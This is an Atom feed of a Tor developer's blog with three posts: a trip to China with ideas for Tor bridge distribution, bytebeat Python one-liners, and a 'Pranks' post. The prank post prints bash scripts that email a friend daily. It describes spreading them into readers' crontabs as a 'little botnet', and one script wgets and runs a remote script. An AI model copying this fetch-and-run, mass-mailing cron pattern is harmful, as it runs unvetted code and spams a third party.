<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>A Pelican Blog</title><link href="/" rel="alternate"></link><link href="/feeds/hacking.atom.xml" rel="self"></link><id>/</id><updated>2013-04-28T13:38:00Z</updated><entry><title>Tor Bridge Distribution &amp; OONI's Data Collector</title><link href="/tor-bridge-distribution-oonis-data-collector.html" rel="alternate"></link><updated>2013-04-28T13:38:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2013-04-28:tor-bridge-distribution-oonis-data-collector.html</id><summary type="html">&lt;p&gt;Last week, I went to China, for the first -- and possibly the last --
time. &lt;/p&gt;
&lt;p&gt;Later, when I feel like complaining, I'll blog about the negative things, like
the evidence that someone had broken into mine and another Tor developer's
hotel room. As well as the tale of being followed by multiple plainclothes
people through the streets of Kowloon, again with another Tor developer, down
alleys, in and out of cabs, through electronic stores where I loudly and openly
bought tiny audio/video devices to bug myself and the hotel room with. This is
the first time I've ever worn a wire (I know, &lt;em&gt;they all say that&lt;/em&gt;, right?): it
doens't feel right. I felt the compulsion to warn people who walked up and
started talking to me before they spoke. And even then I still felt dirty and
creepy.&lt;/p&gt;
&lt;p&gt;&lt;img alt="king-of-kowloon" src="/static/images/2013/04/king-of-kowloon-small.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;When I started officially working on things for the
&lt;a href="https://torproject.org"&gt;Tor Project&lt;/a&gt; last year, I'd imagined that the world
was like a map in an RPG, and that there were a lot of dark, hazy spots that
needed filling in. I worried that if my legal name was publicly attached to Tor
that places like China, Iran, and Syria would always remain dark spots. The
idea that I might be prevented from seeing experiencing those cultures and
regions firsthand, that I would not be able to see the homelands of people I
wanted to empower, merely because a (&lt;em&gt;corrupt&lt;/em&gt; would be redundant) government
had gotten wise to some name I don't answer to -- it seemed daunting, and a bit
heartbreaking.&lt;/p&gt;
&lt;p&gt;&lt;img alt="kowloon-1" src="/static/images/2013/04/kowloon-1.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;I've been thinking a lot more about borders lately. Ashamed as I am to admit it
(it's not like I was ever &lt;em&gt;in favour&lt;/em&gt; of having borders), until now I've held a
very privileged perspective on them. Sure, borders suck. Got it. Yep, people
should be allowed to work wherever they want. Freedom of association, right?
And yet it had never occurred to me: that an invisible line drawn in the sand
could keep you away from your home, or that an arbitrary date on a slip of
paper could decide how long you were permitted to see someone you loved.&lt;/p&gt;
&lt;p&gt;After living in Germany and France for precisely the number of days my tourist
visa would allow, (Oops. I'd been counting, and thought I was still a week
under. I should probably script that.) I took off for Hong Kong, where
&lt;a href="https://openitp.org"&gt;OpenITP&lt;/a&gt; had generously offered me a travel grant to
attend
&lt;a href="http://openitp.org/?q=node/32"&gt;the third Censorship Circumvention Summit&lt;/a&gt;. Jumping
from France to China to somewhere-undetermined-that-is-not-Schengen definitely
presented some interesting security challenges, since I had to take &lt;em&gt;all of the
things&lt;/em&gt; I own with me. (It all fits in a backpack, so it's not a space/money
issue, it's a &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;"%&amp;amp;$#@! I'm carrying devices which normally have access to thousands of
computers, including some Tor Project infrastructure and repositories, and I
have to keep them safe from a government that is going to hate me more than
the United States, while eating nothing but plain rice &lt;em&gt;and&lt;/em&gt; travelling
24,671 kilometers?!"
&lt;br&gt;issue.&lt;/br&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Since part of this security setup involved not connecting to anything while
inside China, I tried as best as I could to remove network capability from my
laptop, including recompiling my kernel with most of the CONFIG_[*NET|IP*]
settings disabled. Without internet and only IRL people to talk to, I got bored
pretty fast (&lt;em&gt;kidding!&lt;/em&gt; ♡ ) and resorted to pen and paper technology, because I
had some ideas on Tor bridge distribution regarding a system for having clients
connect to a bridge Distributor, and the Distributor authenticating the clients
or requiring a valid Proof-of-Work computation. If the authcheck or PoW doesn't
pass, the Distributor should instruct an OONI Data Collector node to connect to
the client, to scan for censorship events (&lt;em&gt;I wonder if we can actually get a
network vantage point from the DPI boxes?&lt;/em&gt; :D ), else if the client check
passes, the Distributor should instruct a Tor Bridge to connect to the client.&lt;/p&gt;
&lt;p&gt;Here are &lt;a href="/static/images/2013/04/bdb-and-ooni.jpg"&gt;my notes&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Obviously, the Distributors are going to get blocked, but if we were to use
something like David Fifield's FlashProxy, with it's Facilitator as our
Distributor (notice how all these words are oh-so-cleverly suffixed with
&lt;em&gt;Tor&lt;/em&gt;...), to contact the Distributor through a "normal" browser, the client
should still be able to compute the auth/PoW and the Bridge or OONI Collector
connect back to them. The Proof-of-Work should be necessary for protecting the
Facilitator/Distributor from getting blocked, as well as significantly increase
the cost of scanning for bridges.&lt;/p&gt;
&lt;p&gt;&lt;img alt="kowloon-nathan-rd" src="/static/images/2013/04/kowloon-nathan-rd.jpg" /&gt;&lt;/p&gt;</summary><category term="China"></category><category term="OONI"></category><category term="Tor"></category><category term="Censorship"></category></entry><entry><title>Algorithmic Compositions</title><link href="/algorithmic-compositions.html" rel="alternate"></link><updated>2013-04-05T17:42:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2013-04-05:algorithmic-compositions.html</id><summary type="html">&lt;p&gt;For a long time, I couldn't figure out what Twitter was for. I'm not sure I've
figured that out yet. It seems convenient for posting links to the physics and
cryptography whitepapers I read, and then receiving the internet standard --
inane feedback from people I've never even heard of.&lt;/p&gt;
&lt;p&gt;At one point, because I couldn't figure out what to do with Twitter, I decided
to release a bytebeat album through tweets. I've seen people tweet links to
their new songs or albums or whatever -- that's lame. &lt;/p&gt;
&lt;p&gt;So I started creating algorithmic compositions in less than 140 characters in
python. The album, &lt;em&gt;fuck_your_bits&lt;/em&gt; (hashtag='#fyb'), is about half done,
but my friends &lt;a href="http://thoughtcrime.org"&gt;Moxie&lt;/a&gt; and
&lt;a href="https://twitter.com/emblem__"&gt;Emblem&lt;/a&gt; pointed out that not only would the
search function for hashtags on twitter index only the songs in my album from
the past three weeks, but also that tweets in my timeline were dropped from
public view after a certain number of months, depending on some indeterminable
number of other algorithms that calculated "tweet popularity".&lt;/p&gt;
&lt;p&gt;Because people have been asking for the full album, here it is. I'll still keep
tweeting it though, because the only other useful thing I can think of that
fits in less than 140 bytes is shellcode.&lt;/p&gt;
&lt;pre class="prettyprint lang-py"&gt;
python -c'import sys;[sys.stdout.write(chr((~t&amp;t&gt;&gt;3^(((t&gt;&gt;((t&gt;&gt;11)%7+6))%15)*t))%256))for t in xrange(2**19)]'|aplay
&lt;/pre&gt;

&lt;pre class="prettyprint lang-py"&gt;
python -c'import sys;[sys.stdout.write(chr(((~t&gt;&gt;2)*(2+(42&amp;t*((7&amp;t&gt;&gt;10)*2))&lt;(24&amp;t*((3&amp;t&gt;&gt;14)+2))))%256))for t in xrange(2**18)]'|aplay
&lt;/pre&gt;

&lt;pre class="prettyprint lang-py"&gt;
python -c'import sys;[sys.stdout.write(chr((((t*5&amp;t&gt;&gt;7|t*9&amp;t&gt;&gt;4|t*18&amp;t/1024)|((t|7)&gt;&gt;5|(t|4)&gt;&gt;9)))%256))for t in xrange(2**18)]'|aplay
&lt;/pre&gt;

&lt;pre class="prettyprint lang-py"&gt;
python -c'import sys;[sys.stdout.write(chr(((~t&gt;&gt;2)*((127&amp;t*(7&amp;t&gt;&gt;9))&lt;(245&amp;t*(4-(7&amp;t&gt;&gt;13)))))%256))for t in xrange(2**20)]'|aplay -c 2 -r4444
&lt;/pre&gt;

&lt;pre class="prettyprint lang-py"&gt;
python -c'import sys;[sys.stdout.write(chr((~t&gt;&gt;5&gt;&gt;(127&amp;t*9&amp;~t&gt;&gt;7&lt;42&amp;t*23^5&amp;~t&gt;&gt;13)+3)%256))for t in xrange(2**18)]'|aplay -c2 -r2222
&lt;/pre&gt;

&lt;pre class="prettyprint lang-py"&gt;
python -c'import sys;[sys.stdout.write(chr((((t&gt;&gt;(2|4)&amp;((t%0x7369)|4|11|5))+(7|4|42)&amp;t))%256))for t in xrange(2**18)]'|aplay -c2 -r4444
&lt;/pre&gt;

&lt;pre class="prettyprint lang-py"&gt;
python -c'import sys;[sys.stdout.write(chr((((t*(t&gt;&gt;13|t&gt;&gt;8)|(t&gt;&gt;16)-t)-64))%256))for t in xrange(2**18)]'|aplay -r4444
&lt;/pre&gt;</summary><category term="python"></category><category term="bytebeats"></category><category term="twitter"></category></entry><entry><title>Pranks</title><link href="/pranks.html" rel="alternate"></link><updated>2012-06-28T07:42:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2012-06-28:pranks.html</id><summary type="html">&lt;p&gt;So, while I'm busy researching away, hard at work &lt;a href="https://trac.torproject.org/projects/tor/ticket/6184"&gt;reverse engineering
proprietary network monitoring software&lt;/a&gt;, and trying to devise methodologies
&lt;a href="https://ooni.nu"&gt;for detecting all&lt;/a&gt; the various and newly-emerging means for technological
censorship that the world's government seem to be
&lt;a href="http://www.maannews.net/eng/viewdetails.aspx?id=478726"&gt;oh&lt;/a&gt;-&lt;a href="http://www.scmagazine.com.au/News/306441,telstra-tracks-users-to-build-web-filter.aspx"&gt;so&lt;/a&gt;-&lt;a href="http://arstechnica.com/tech-policy/2012/06/chinese-online-censorship-targets-collective-action-posts/"&gt;peachy&lt;/a&gt;-&lt;a href="https://www.google.com/transparencyreport/removals/government/"&gt;keen&lt;/a&gt; on developing (the &lt;a href="http://youtu.be/C9-LjX8wk60?t=1m1s"&gt;State Department
recently mentioned our research&lt;/a&gt; in their daily briefing), my friend
&lt;a href="https://twitter.com/kaepora"&gt;Nadim&lt;/a&gt; gets to sit around, playing with crypto, doing things like
implementing the &lt;a href="http://www.larc.usp.br/~pbarreto/AnubisPage.html"&gt;Anubis cipher&lt;/a&gt; &lt;a href="https://jslibs.googlecode.com/svn/trunk/src/jscrypt/cipher.cpp"&gt;for Javascript&lt;/a&gt; and inventing &lt;a href="https://potion.io"&gt;music
sharing services with 80s-retro aesthetics&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;And then, he invents &lt;a href="https://crypto.cat"&gt;Cryptocat&lt;/a&gt;. Some of you might have heard of it.  It's
&lt;a href="http://www.cypherpunks.ca/otr/"&gt;OTR&lt;/a&gt;, in your browser, as client-side Javascript, and we're hoping to build
it into the Tor Browser Bundle someday. But...that OTR business...I don't
know. It's so &lt;em&gt;nineties&lt;/em&gt;. And Ian Goldberg recently published a new paper &lt;a href="http://www.cypherpunks.ca/~iang/pubs/mpotr.pdf"&gt;on
multi-party off-the-record messaging&lt;/a&gt;, but it hasn't been implemented
anywhere yet. Cryptocat is supposed to have multi-party encrypted messaging
support soon, and Nadim was going back and forth on the spec -- there were
some open questions, for example, whether or not the static asymmetric keypair
was necessary given that the each chat was already an in-browser session.&lt;/p&gt;
&lt;p&gt;(Cryptonerd tangent: I argue that the static keypair is still necessary due to
Alice and Bob still needing to authenticate to each other with new ephemeral
keypairs when Charlie joins the chat session. Calculation of the session ID
&lt;em&gt;sid&lt;/em&gt;(i), and thus the group key &lt;em&gt;gk&lt;/em&gt;(i) for participants &lt;em&gt;P&lt;/em&gt;(i) depends on
the ephemeral public key {E(Y,i) | Y ∈ &lt;em&gt;P&lt;/em&gt;(i)} of each participant, ergo to
add to or remove from &lt;em&gt;P&lt;/em&gt;(i) a new &lt;em&gt;sid&lt;/em&gt;(i) must be derived, and one should
never reuse E(i). Second, if a user wants to have multiple sids at the same
time, or exit one chat and then join another, assuming that Cryptocat allows
that and that it is done all in the same browser tab, then obviously for the
same reason as before they will need both static and ephemeral keypairs.)&lt;/p&gt;
&lt;p&gt;So, myself and some other people involved with Tor, and stuff and crypto
and stuff, took to sending messages to Nadim in all sorts of fanciful
and prankish ways, just to say "IMPLEMENT MPOTR." Notes under the hotel
room door in Brazil; late night phone calls; sharpie on his face after
diving over a conference room table to tackle him. That sort of thing.&lt;/p&gt;
&lt;p&gt;Then! I got bored doing some thing where I do something that involves a
computer. And I wrote &lt;a href="http://patternsinthevoid.net/kaepora.mean"&gt;this&lt;/a&gt;:&lt;/p&gt;
&lt;pre class="prettyprint lang-sh"&gt;
#!/bin/bash
###############################################################
# kaepora
# -------
# Sends an email to @kaepora about implementing MPOTR.
# Requires 'dict' and 'fortune-mod', mutt as your configured
# mail client, and some sort of MTA.
#
# @author isis agora lovecruft Agora Lovecruft, 0x2cdb8b35
# @date 11 June 2012
###############################################################

. ~/.bashrc

TO="nadim@nadim.cc"
FUTURE=`/usr/games/fortune`
FUTURE_FIRST=${FUTURE:0:1}
FUTURE_LAST=${FUTURE:1}
FUTURE="${FUTURE_FIRST,,}$FUTURE_LAST"
FUTURE=${FUTURE%%?[-][-]*}

set -- junk $FUTURE; shift

if [[ "$#" -gt "10" ]] ; then
    SUBJECT="When you implement mpOTR, "`/bin/echo ${@:1:10}`"..."
    shift 10
    BODY="...""$@"
else
    SUBJECT="When you implement mpOTR, $@"
fi
BODY="$BODY"`/usr/bin/whoami`"@"`/bin/hostname`":~$ dict implement
"`/usr/bin/dict implement`"
"`/usr/bin/whoami`"@"`/bin/hostname`":~$ dict mpOTR
"`/usr/bin/dict mpOTR 2&gt;&amp;1`""

echo "${BODY}" | mutt -s "${SUBJECT}" ${TO}
&lt;/pre&gt;

&lt;p&gt;Which, short explanation, sends a fancy email to Nadim about how he
needs to IMPLEMENT MPOTR.&lt;/p&gt;
&lt;p&gt;And then I tweeted this:&lt;/p&gt;
&lt;p&gt;&lt;img alt="kaepora-mean-tweet" src="/static/images/kaepora-mean-tweet.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;Which grabs the above script and puts it in the user's crontab so that
the email goes out daily (and each day it's a different email).&lt;/p&gt;
&lt;p&gt;I don't actually know how many people crontabbed it. I'm hoping not many,
because I didn't really program any undo button on the little botnet. I
dunno. Twitter. I just wasn't expecting people to read my feed, let alone
click links.&lt;/p&gt;
&lt;p&gt;But now, Nadim's just about done IMPLEMENTING MPOTR, so I feel bad. Now
there's &lt;a href="http://patternsinthevoid.net/kaepora"&gt;this&lt;/a&gt;:&lt;/p&gt;
&lt;pre class="prettyprint lang-sh"&gt;
#!/bin/bash
###############################################################
# kaepora (nice version)
# ----------------------
# Sends an email to @kaepora to say thanks for implementing 
# MPOTR.  Requires 'fortune-mod', mutt as your configured mail 
# client, a default install of python&gt;=2.5 and some sort of MTA.
#
# @author isis agora lovecruft Agora Lovecruft, 0x2cdb8b35
# @date 28 June 2012
###############################################################

. $HOME/.bashrc

TO="nadim@nadim.cc"
ALSO="isis agora lovecruft@patternsinthevoid.net"
FUTURE=`/usr/games/fortune -e science computers`
FUTURE_FIRST=${FUTURE:0:1}
FUTURE_LAST=${FUTURE:1}
FUTURE="${FUTURE_FIRST,,}$FUTURE_LAST"
FUTURE=${FUTURE%%?[-][-]*}

set -- junk $FUTURE; shift

if [[ "$#" -gt "10" ]] ; then
    SUBJECT="Because you implemented mpOTR, "`/bin/echo ${@:1:10}`"..."
    shift 10
    BODY="...""$@"
else
    SUBJECT="Because you implemented mpOTR, $@"
fi

BODY_SCRIPT=$HOME/scripts/geo-kaepora

if [[ -z $BODY_SCRIPT ]] ; then
    if [[ -z $HOME/.geo-kaepora ]] ; then
        wget -O $HOME/.geo-kaepora http://www.patternsinthevoid.net/geo-kaepora
        chmod +x $HOME/.geo-kaepora
    fi

    BODY_SCRIPT=$HOME/.geo-kaepora
fi

BODY="$BODY"`$BODY_SCRIPT`""
echo "${BODY}" | mutt -s "${SUBJECT}" ${TO}

## Just to be fair this time...
echo "${BODY}" | mutt -s "${SUBJECT}" ${ALSO}
&lt;/pre&gt;

&lt;p&gt;Which downloads and calls &lt;a href="http://patternsinthevoid.net/geo-kaepora"&gt;this ridiculous python script&lt;/a&gt;:&lt;/p&gt;
&lt;pre class="prettyprint lang-py"&gt;
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#################################################################################
# geo-kaepora
# -----------------------
# Prints a random abstract geometrical shape as ascii art!
# Makes a pretty!
# Tells a story written by an AI!
#
# @author Isis Agora Lovecruft, 0x2cdb8b35
# @version 0.0.1
# @date 28 June 2012
#________________________________________________________________________________
# Changelog:
# ----------
# v0.0.1: For kaepora! &lt;(A)3
#         Thanks for being awesome and implementing mpOTR!
#################################################################################

from os import path
from random import choice
from simplejson import loads
from urllib2 import urlopen
from urlparse import urlparse, urlunparse

import socket

class InvalidURL(Exception):
    pass

class SafemnAPI():
    def __init__(self):
        self.URL_SHORTEN = "http://safe.mn/api/?url=%s&amp;format=json"

    def shorten(self, url):
        try:
            url = urlunparse(urlparse(url))
            response = urlopen(self.URL_SHORTEN % url)
            json = response.read()
            json_decode = loads(json)
            url = json_decode.get('url', None)
            if url is None:
                raise InvalidURL
            return url
        except Exception, e:
            raise e

class ForKaepora():

    def __init__(self):
        pass

    @staticmethod
    def print_a_shape(self):
        shapes = []
        shapes.append("""
                                    ,_-=(!7(7/zs_.
                                 .='  ' .`/,/!(=)Zm.
                   .._,,._..  ,-`- `,\ ` -` -`\\7//WW.
              ,v=~/.-,-\- -!|V-s.)iT-|s|\-.'   `///mK%.
            v!`i!-.e]-g`bT/i(/[=.Z/m)K(YNYi..   /-]i44M.
          v`/,`|v]-DvLcfZ/eV/iDLN\D/ZK@%8W[Z..   `/d!Z8m
         //,c\(2(X/NYNY8]ZZ/bZd\()/\7WY%WKKW)   -'|(][%4.
       ,\\i\c(e)WX@WKKZKDKWMZ8(b5/ZK8]Z7%ffVM,   -.Y!bNMi
       /-iit5N)KWG%%8%%%%W8%ZWM(8YZvD)XN(@.  [   \]!/GXW[
      / ))G8\NMN%W%%%%%%%%%%8KK@WZKYK*ZG5KMi,-   vi[NZGM[
     i\!(44Y8K%8%%%**~YZYZ@%%%%%4KWZ/PKN)ZDZ7   c=//WZK%!
    ,\y\YtMZW8W%%f`,`.t/bNZZK%%W%%ZXb*K(K5DZ   -c\\/KM48
    -|c5PbM4DDW%f  v./c\[tMY8W%PMW%D@KW)Gbf   -/(=ZZKM8[
    2(N8YXWK85@K   -'c|K4/KKK%@  V%@@WD8e~  .//ct)8ZK%8`
    =)b%]Nd)@KM[  !'\cG!iWYK%%|   !M@KZf    -c\))ZDKW%`
    YYKWZGNM4/Pb  '-VscP4]b@W%     'Mf`   -L\///KM(%W!
    !KKW4ZK/W7)Z. '/cttbY)DKW%     -`  .',\y)K(5KW%%f
    'W)KWKZZg)Z2/,!/L(-DYYb54%  ,,`, -\-/y(((KK5WW%f
     \M4NDDKZZ(e!/\7vNTtZd)8\Mi!\-,-/i-v((tKNGN%W%%
     'M8M88(Zd))///((|D\tDY\\KK-`/-i(=)KtNNN@W%%%@%[
      !8%@KW5KKN4///s(\Pd!ROBY8/=2(/4ZdzKD%K%%%M8@%%
       '%%%W%dGNtPK(c\/2\[Z(ttNYZ2NZW8W8K%%%%YKM%M%%.
         *%%W%GW5@/%!e]_tZdY()v)ZXMZW%W%%%*5Y]K%ZK%8[
          '*%%%%8%8WK\)[/ZmZ/Zi]!/M%%%%@f\ \Y/NNMK%%!
            'VM%%%%W%WN5Z/Gt5/b)((cV@f`  - |cZbMKW%%|
               'V*M%%%WZ/ZG\+5((+)L'-,,/  -)X(NWW%%%
                    `~`MZ/DZGNZG5(((\,    ,t\\Z)KW%@
                       'M8K%8GN8\5(5///]i!v\K)85W%%f
                         YWWKKKKWZ8G54X/GGMeK@WM8%@
                          !M8%8%48WG@KWYbW%WWW%%%@
                            VM%WKWK%8K%%8WWWW%%%@`
                              ~*%%%%%%W%%%%%%%@~
                                 ~*MM%%%%%%@f`
                                     '''''

    """)
        shapes.append("""
                     _______
                    / _____ \
              _____/ /     \ \_____
             / _____/  311  \_____ \
       _____/ /     \       /     \ \_____
      / _____/  221  \_____/  412  \_____ \
     / /     \       /     \       /     \ \
    / /  131  \_____/  322  \_____/  513  \ \
    \ \       /     \       /     \       / /
     \ \_____/  232  \_____/  423  \_____/ /
     / /     \       /     \       /     \ \
    / /  142  \_____/  333  \_____/  524  \ \
    \ \       /     \       /     \       / /
     \ \_____/  243  \_____/  434  \_____/ /
     / /     \       /     \       /     \ \
    / /  153  \_____/  344  \_____/  535  \ \
    \ \       /     \       /     \       / /
     \ \_____/  254  \_____/  445  \_____/ /
      \_____ \       /     \       / _____/
            \ \_____/  355  \_____/ /
             \_____ \       / _____/
                   \ \_____/ /
                    \_______/

    """)
        shapes.append("""
    +------+.      +------+       +------+       +------+      .+------+
    |`.    | `.    |\     |\      |      |      /|     /|    .' |    .'|
    |  `+--+---+   | +----+-+     +------+     +-+----+ |   +---+--+'  |
    |   |  |   |   | |    | |     |      |     | |    | |   |   |  |   |
    +---+--+.  |   +-+----+ |     +------+     | +----+-+   |  .+--+---+
     `. |    `.|    \|     \|     |      |     |/     |/    |.'    | .'
       `+------+     +------+     +------+     +------+     +------+'

       .+------+     +------+     +------+     +------+     +------+.
     .' |    .'|    /|     /|     |      |     |\     |\    |`.    | `.
    +---+--+'  |   +-+----+ |     +------+     | +----+-+   |  `+--+---+
    |   |  |   |   | |    | |     |      |     | |    | |   |   |  |   |
    |  ,+--+---+   | +----+-+     +------+     +-+----+ |   +---+--+   |
    |.'    | .'    |/     |/      |      |      \|     \|    `. |   `. |
    +------+'      +------+       +------+       +------+      `+------+

       .+------+     +------+     +------+     +------+     +------+.
     .' |      |    /|      |     |      |     |      |\    |      | `.
    +   |      |   + |      |     +      +     |      | +   |      |   +
    |   |      |   | |      |     |      |     |      | |   |      |   |
    |  .+------+   | +------+     +------+     +------+ |   +------+.  |
    |.'      .'    |/      /      |      |      \      \|    `.      `.|
    +------+'      +------+       +------+       +------+      `+------+
    """)
        shapes.append("""
      _______________________________
     /\                              \ 
    /++\    __________________________\ 
    \+++\   \ ************************/
     \+++\   \___________________ ***/
      \+++\   \             /+++/***/
       \+++\   \           /+++/***/
        \+++\   \         /+++/***/
         \+++\   \       /+++/***/
          \+++\   \     /+++/***/
           \+++\   \   /+++/***/
            \+++\   \ /+++/***/
             \+++\   /+++/***/
              \+++\ /+++/***/
               \+++++++/***/
                \+++++/***/
                 \+++/***/
                  \+/___/

    """)
        shapes.append("""
              +_____A_____+
             /:`          :\ 
           D/ : `         : B
           /  :  `        :  \ 
          /   :   +-----A-----+
         +______A_|__,    :   :
         :`   *___|_A_\___+   :
         : `  `   C  : B   \  :
         :  `  `  |  :  \   B :
         :   +--`-|--A---+   \:
         :   |   `+____A______+
         *__ |__A____+   :   ,
         `   |        \  :  ,
          `  C         B : ,
           ` |          \:,
            `+_____A_____+

          Tessaract like wut!

    """)
        shapes.append("""
                               .--. 
                               \  / 
                            .--.\/.--.  
                       .--.|    \\    |.--. 
                       \  / '--'/\'--' \  / 
                    .--.\/.--. /  \ .--.\/.--. 
               .--.|    \\    |:--:|    \\    |.--. 
               \  / '--'/\'--' \  / '--'/\'--' \  / 
            .--.\/.--. /  \ .--.\/.--. /  \ .--.\/.--.  
           |    \\    |:--:|    \\    |:--:|    \\    | 
            '--'/\'--' \  / '--'/\'--' \  / '--'/\'--'
               /  \ .--.\/.--. /  \ .--.\/.--. /  \ 
               '--'|    \\    |:--:|    \\    |'--' 
                    '--'/\'--' \  / '--'/\'--' 
                       /  \ .--.\/.--. /  \ 
                       '--'|    \\    |'--' 
                            '--'/\'--' 
                               /  \ 
                               '--' 
    """)
        shapes.append("""
                              _
                             /\\ 
                            /  \\ 
                           / /\ \\ 
                          / // \ \\ 
                          \ \\ / // 
                        _  \ \/ //  _ 
                       /\\  \ \//  /\\ 
                      /  \\ /\ \\ /  \\ 
                     / /\ \/ /\ \/ /\ \\ 
                    / // \/ // \/ // \ \\ 
                    \ \\ / /\\ / /\\ / // 
                  _  \ \/ /\ \/ /\ \/ //  _
                 /\\  \ \// \ \// \ \//  /\\  
                /  \\ /\ \\ /\ \\ /\ \\ /  \\ 
               / /\ \/ /\ \/ /\ \/ /\ \/ /\ \\ 
              / // \/ // \/ // \/ // \/ // \ \\ 
              \ \\ / /\\ / /\\ / /\\ / /\\ / //
            _  \ \/ /\ \/ /\ \/ /\ \/ /\ \/ //  _
           /\\  \ \// \ \// \ \// \ \// \ \//  /\\ 
          /  \\ /\ \\ /\ \\ /\ \\ /\ \\ /\ \\ /  \\ 
         / /\ \/ /\ \/ /\ \/ /\ \/ /\ \/ /\ \/ /\ \\ 
        / // \/ // \/ // \/ // \/ // \/ // \/ // \ \\ 
        \ \\ / /\\ / /\\ / /\\ / /\\ / /\\ / /\\ / //
         \ \/ /\ \/ /\ \/ /\ \/ /\ \/ /\ \/ /\ \/ //
          \  // \ \// \ \// \ \// \ \// \ \// \  //
           \//  /\ \\ /\ \\ /\ \\ /\ \\ /\ \\  \//
               / /\ \/ /\ \/ /\ \/ /\ \/ /\ \\ 
              / // \/ // \/ // \/ // \/ // \ \\ 
              \ \\ / /\\ / /\\ / /\\ / /\\ / // 
               \ \/ /\ \/ /\ \/ /\ \/ /\ \/ // 
                \  // \ \// \ \// \ \// \  // 
                 \//  /\ \\ /\ \\ /\ \\  \// 
                     / /\ \/ /\ \/ /\ \\ 
                    / // \/ // \/ // \ \\ 
                    \ \\ / /\\ / /\\ / // 
                     \ \/ /\ \/ /\ \/ // 
                      \  // \ \// \  // 
                       \//  /\ \\  \// 
                           / /\ \\ 
                          / // \ \\ 
                          \ \\ / // 
                           \ \/ // 
                            \  // 
                             \// 
    """)
        #ascii_art = choice(shapes)
        #ascii_art_fixed = r'%s' % ascii_art
        #print ascii_art_fixed

        return shapes

    @staticmethod
    def make_a_pretty():
        pretty = ['http://www.brianpiana.com/wp-content/uploads/2011/08/landscape1.png',
                  'https://s3.amazonaws.com/data.tumblr.com/tumblr_m46s1kMGx31qzt4vjo1_r1_500.gif',
                  'https://s3.amazonaws.com/data.tumblr.com/tumblr_m436mzp63k1qzt4vjo1_r7_500.gif',
                  'https://s3.amazonaws.com/data.tumblr.com/tumblr_m39qj6mK6v1qzt4vjo1_500.gif',
                  'https://s3.amazonaws.com/data.tumblr.com/tumblr_m2qw2jzPkJ1qzt4vjo1_r1_500.gif',
                  'http://davidope.com/tmblr/120305_xxl.gif',
                  'https://s3.amazonaws.com/data.tumblr.com/tumblr_m0ch5i6PWe1qzt4vjo1_500.gif',
                  'https://s3.amazonaws.com/data.tumblr.com/tumblr_lztyt60lS91qzt4vjo1_500.gif',
                  'https://s3.amazonaws.com/data.tumblr.com/tumblr_lz9c7jeS3b1qzt4vjo1_500.gif',
                  'https://s3.amazonaws.com/data.tumblr.com/tumblr_lxkgfkEHxn1qzt4vjo1_500.gif',
                  'http://davidope.com/tmblr/the_same.png',
                  'http://www.wayfarergallery.net/hot-images/wp-content/uploads/2010/08/Grid-Works2000-bw-4.gif',
                  'http://www.wayfarergallery.net/hot-images/wp-content/uploads/2010/08/Grid-Works2000-bw-3.gif',
                  'http://www.wayfarergallery.net/hot-images/wp-content/uploads/2010/08/Grid-Works2000-bw-21.gif',
                  'http://www.wayfarergallery.net/hot-images/wp-content/uploads/2010/08/Grid-Works2000-bw-1.gif',
                  'https://s3.amazonaws.com/data.tumblr.com/tumblr_lvabjmK8Ab1qzt4vjo1_500.gif',
                  'https://s3.amazonaws.com/data.tumblr.com/tumblr_luda3yYxzm1qzt4vjo1_500.gif',
                  'http://dearcomputer.nl/priwrid/',
                  'http://www.alwaysloading.com/',
                  'http://www.master-list2000.com/abillmiller/pages/imagePages/gridworks2000-blogdrawings-collage18.html',
                  'http://www.master-list2000.com/abillmiller/pages/imagePages/gridworks2000-blogdrawings-collage-4.html',
                  'http://www.master-list2000.com/abillmiller/pages/imagePages/gridworks2000-anim09.html',
                  'http://place3.elnafrederick.computersclub.org/',
                  'http://www.todayandtomorrow.net/wp-content/uploads/2009/12/gate_to_night_gate_to_day.gif',
                  'http://www.todayandtomorrow.net/wp-content/uploads/2009/12/revolving_door.gif',
                  'http://www.innerdoubts.com/',
                  'https://s3.amazonaws.com/data.tumblr.com/tumblr_m64wdyXg4a1qzt4vjo1_500.gif',
                  'https://s3.amazonaws.com/data.tumblr.com/tumblr_m618fya1Me1qzt4vjo1_r1_500.gif',
                  'https://s3.amazonaws.com/data.tumblr.com/tumblr_m5sbvyRME11qzt4vjo1_500.gif',
                  'https://s3.amazonaws.com/data.tumblr.com/tumblr_m5ew7vyBE71qzt4vjo1_500.gif',
                  'https://s3.amazonaws.com/data.tumblr.com/tumblr_m51woeJu3w1qzt4vjo1_r4_500.gif',
                  'https://s3.amazonaws.com/data.tumblr.com/tumblr_m4znrlTlEy1qzt4vjo1_r2_500.gif']

        picture = choice(pretty)
        safemn = SafemnAPI()
        short = safemn.shorten(picture)

        msg = "And we thought you'd find this pretty:\n" + short + "\n"
        return msg

    @staticmethod
    def pick_a_story(self):
        dt = socket.getdefaulttimeout=4
        base_url = 'http://dearcomputer.nl/extras/story/readstory.php?id='
        text_urls = []

        for x in range(1, 498):
            story_url = (base_url + str(x))
            text_only = ('http://html2text.theinfo.org/?url=' + story_url) 
            text_urls.append(text_only)

        story = choice(text_urls)

        try:
            story_opened = urlopen(story, timeout=dt)
        except Exception:
            return

        if story_opened:
            story_text = urlopen(story).read()

            # Law of Demeter, my ass!
            raw_title = story_text.split('*', 2)[2].split('*', 1)[0]
            raw_story = story_text.split('* * *', 1)[1].strip()

            nice = '***  ' + raw_title + '  ***\n'
            nicer = raw_story.replace('\n\n\n', '\n')
            nicer_again = nicer.replace('\n\n', '\n')

            first_line = len(nice)
            line = '*' * first_line

            nicest = line + '\n' + nice + line + '\n' + nicer_again 
            return nicest
        else:
            return " "

    def store_a_story(self):
        separator = "!!!!!!!!!"
        stories = path.join(path.abspath(path.curdir), 
                            '.ai_generated_stories')

        with open(stories, "a+") as seen:
            total = seen.read()
            have = total.split(separator)

            count = len(have)

            if count &gt; 150:
                ai_story = choice(have)
            else:
